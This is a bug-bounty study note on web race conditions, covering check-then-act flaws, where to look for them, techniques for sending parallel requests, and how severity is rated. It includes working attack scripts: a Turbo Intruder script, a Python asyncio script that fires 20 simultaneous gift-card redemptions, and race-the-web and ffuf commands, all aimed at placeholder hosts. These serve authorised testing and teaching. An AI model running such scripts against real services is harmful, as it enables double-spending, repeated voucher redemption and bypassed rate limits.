# Race Conditions

← [[VRT-Overview]] | [[Business-Logic-Flaws]]

---

Race conditions happen when an application performs a check and then an action — and another request slips in between the check and the action. The result is that both requests pass the check but both execute the action.

VRT rates these under "Server Security Misconfiguration → Race Condition" with a **Varies** severity depending on impact.

---

## The Classic Pattern: Check-Then-Act

```
Thread A: Is gift card balance > 0? → Yes (balance: $100)
Thread B: Is gift card balance > 0? → Yes (balance: $100)  ← slips in here
Thread A: Subtract $100 from balance → balance: $0
Thread B: Subtract $100 from balance → balance: -$100
```

Two threads both check before either updates. Both pass the check. Both execute.

---

## Where to Look

| Feature | Race Condition Scenario |
|---------|------------------------|
| Gift card / voucher redemption | Redeem same code multiple times simultaneously |
| Limited-time offers / flash sales | Purchase more than stock limit |
| Account credit / wallet top-up | Double-spend credits |
| Free trial activation | Activate multiple trials on same account |
| Password reset | Request two reset emails; both tokens valid simultaneously |
| File upload with virus scan | Upload between scan and move |
| Rate-limited actions (OTP, login) | Bypass rate limit by paralleling requests |
| Transfer funds | Transfer same balance twice |
| Coupon/promo code | Use coupon more than once |
| "Only 1 per account" checks | Create multiple subscriptions/orders |

---

## The Exploit Technique: Parallel Requests

The key is sending requests **as close to simultaneously as possible** to hit the race window.

### Turbo Intruder (Burp Suite — best method)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=100,
        pipeline=True   # HTTP pipeline: send without waiting for response
    )
    # Send 30 identical requests simultaneously
    for i in range(30):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

The `pipeline=True` option queues requests in a single TCP connection, dramatically reducing timing variation from network jitter.

### Last-Byte Sync Technique

For even tighter timing (HTTP/2 or when pipeline isn't available):

1. Prepare N requests, all identical
2. Send each request but **hold the last byte** of each
3. Release all last bytes simultaneously
4. All requests arrive at the server at nearly the same moment

Burp Suite Pro's "Send group in parallel (last-byte sync)" does this automatically.

### Python + asyncio

```python
import asyncio
import aiohttp

async def redeem(session, code):
    async with session.post(
        'https://example.com/redeem',
        json={'code': code},
        cookies={'session': 'YOUR_SESSION'}
    ) as resp:
        return await resp.json()

async def race():
    async with aiohttp.ClientSession() as session:
        tasks = [redeem(session, 'GIFT_CODE_123') for _ in range(20)]
        results = await asyncio.gather(*tasks)
        for r in results:
            print(r)

asyncio.run(race())
```

---

## Confirming the Race Condition

Look for:
- Multiple `200 OK` responses where only one should succeed
- Balance going negative or below zero
- Duplicate records created
- "Code already used" errors for some but not all requests — partial success = race window exists

Even if only 2 out of 30 requests succeed, the race is real. Document it.

---

## Single-Endpoint vs Multi-Endpoint Races

**Single-endpoint:** The same endpoint is hit multiple times simultaneously (gift card redemption, coupon use).

**Multi-endpoint:** Two *different* endpoints interact and have a race window (e.g., change email while also verifying email — if both read the same DB value before either writes).

Multi-endpoint races are rarer and harder to find but are often more impactful.

---

## Severity Assessment

The VRT says "Varies" — because it entirely depends on what the race wins:

| Scenario | Typical Severity |
|----------|----------------|
| Double-spend real money | P1–P2 |
| Double-redeem gift card / voucher | P2 |
| Bypass rate limiting on OTP → brute force | P2 |
| Claim free trial multiple times | P3 |
| Duplicate a non-financial action | P3–P4 |
| Race on a low-impact action | P4–P5 |

---

## Tooling

```bash
# Burp Suite — Turbo Intruder
# Extensions → BApp Store → Turbo Intruder

# race-the-web (Go tool)
race-the-web -url https://example.com/redeem \
  -method POST \
  -body '{"code":"GIFT123"}' \
  -cookie "session=abc123" \
  -count 30

# ffuf with parallel flag
ffuf -u https://example.com/redeem -X POST \
  -d '{"code":"GIFT123"}' \
  -H "Cookie: session=abc123" \
  -w <(printf 'x\n%.0s' {1..30}) \
  -mc 200
```

---

*Related: [[Business-Logic-Flaws]] | [[A04-Insecure-Design]] | [[VRT-Overview]]*

*Sources: Bugcrowd VRT v1.18, PortSwigger Web Security Academy (James Kettle — "Smashing the State Machine")*
